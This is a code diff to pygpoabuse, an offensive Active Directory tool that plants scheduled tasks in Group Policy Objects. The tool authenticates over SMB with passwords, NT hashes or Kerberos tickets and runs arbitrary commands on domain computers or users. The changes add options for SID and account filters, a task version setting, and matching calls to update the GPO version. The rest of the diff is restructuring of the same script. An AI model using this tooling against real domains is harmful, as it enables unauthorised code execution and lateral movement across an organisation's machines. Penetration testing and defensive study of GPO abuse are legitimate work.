@@ -11,10 +11,8 @@ import argparse
 import logging
 import re
 import sys
-
 from impacket.smbconnection import SMBConnection
 from impacket.examples.utils import parse_credentials
-
 from pygpoabuse import logger
 from pygpoabuse.gpo import GPO
 
@@ -39,12 +37,50 @@ parser.add_argument('-ldaps', action='store_true', help='Use LDAPS instead of LD
 parser.add_argument('-ccache', action='store', help='ccache file name (must be in local directory)')
 parser.add_argument('-f', action='store_true', help='Force add ScheduleTask')
 parser.add_argument('-v', action='count', default=0, help='Verbosity level (-v or -vv)')
+parser.add_argument('-FilterUser', action='count', default=0, help='Add user filter to GPO')
+parser.add_argument('-FilterComputer', action='count', default=0, help='Add computer filter to GPO')
+parser.add_argument('-Samaccount', action='store', help='Samaccount name from filter')
+parser.add_argument('-SID', action='store', help='SID object')
+parser.add_argument('-TV', action='store', default="1.4", help='Task version by default 1.4')
+parser.add_argument('-file', type=str, help='File with Samaccoun:SID to add mor than one filter')
 
 if len(sys.argv) == 1:
     parser.print_help()
     sys.exit(1)
 
 options = parser.parse_args()
+
+
+if options.FilterComputer:
+    if getattr(options, 'Samaccount', None) and getattr(options, 'SID', None):
+        archivo = "NOT_NEEDING"
+
+    elif options.file:
+        try:
+            archivo = open (options.file, "r")
+            archivo.close()
+        except:
+            print("The input file doesn't exist")
+            exit()
+    else:
+        print("You need add the computer's SID and samaccount which is going to apply the filters or a file with samaccount:SID")
+        exit()
+elif options.FilterUser:
+    if getattr(options, 'Samaccount', None) and getattr(options, 'SID', None):
+        archivo = "NOT_NEEDING"
+    elif options.file:
+        try:
+            archivo = open (options.file, "r")
+            archivo.close()
+        except:
+            print("The input file doesn't exist")
+            exit()
+    else:
+        print("You need add the user's SID and samaccount who is going to apply filters or a file with samaccount:SID")
+        exit()
+else:
+    user_sid="None"
+    samaccount="None"
 
 if not options.gpo_id:
     parser.print_help()
@@ -96,16 +132,6 @@ else:
     url = '{}+ntlm-nt://{}\\{}:{}@{}'.format(protocol, domain, username, options.hashes.split(":")[1], dc_ip)
     lmhash, nthash = options.hashes.split(":")
 
-
-def get_session(address, target_ip="", username="", password="", lmhash="", nthash="", domain=""):
-    try:
-        smb_session = SMBConnection(address, target_ip)
-        smb_session.login(username, password, domain, lmhash, nthash)
-        return smb_session
-    except Exception as e:
-        logging.error("Connection error")
-        return False
-
 try:
     smb_session = SMBConnection(dc_ip, dc_ip)
     if options.k:
@@ -117,6 +143,11 @@ except Exception as e:
     sys.exit(1)
 
 try:
+    if options.file:
+        archivo = options.file
+    else:
+        archivo = "NOT_NEEDING"
+
     gpo = GPO(smb_session)
     task_name = gpo.update_scheduled_task(
         domain=domain,
@@ -127,14 +158,36 @@ try:
         powershell=options.powershell,
         command=options.command,
         gpo_type="user" if options.user else "computer",
+        filtercomputer=options.FilterComputer,
+        filteruser=options.FilterUser,
+        samaccount=options.Samaccount,
+        user_sid=options.SID,
+        task_version=options.TV,
+        archivo=archivo,
         force=options.f
     )
     if task_name:
-        if gpo.update_versions(url, domain, options.gpo_id, gpo_type="user" if options.user else "computer",):
-            logging.info("Version updated")
+        if options.FilterUser or options.FilterComputer:
+            if gpo.update_versions(url, domain, options.gpo_id, "user" if options.user else "computer", options.Samaccount, options.SID, options.TV, archivo):
+                logging.info("Version updated")
+            else:
+                logging.error("Error while updating versions")
+                sys.exit(1)
         else:
-            logging.error("Error while updating versions")
-            sys.exit(1)
-        logging.success("ScheduledTask {} created!".format(task_name))
+            if gpo.update_versions(url, domain, options.gpo_id, gpo_type="user" if options.user else "computer", samaccount="None", user_sid="None", task_version="1.3", archivo="NOT_NEEDING"):
+                logging.info("Version updated")
+            else:
+                logging.error("Error while updating versions")
+                sys.exit(1)
+            logging.success("ScheduledTask {} created!".format(task_name))
 except Exception as e:
     logging.error("An error occurred. Use -vv for more details", exc_info=True)
+
+def get_session(address, target_ip="", username="", password="", lmhash="", nthash="", domain=""):
+    try:
+        smb_session = SMBConnection(address, target_ip)
+        smb_session.login(username, password, domain, lmhash, nthash)
+        return smb_session
+    except Exception as e:
+        logging.error("Connection error")
+        return False
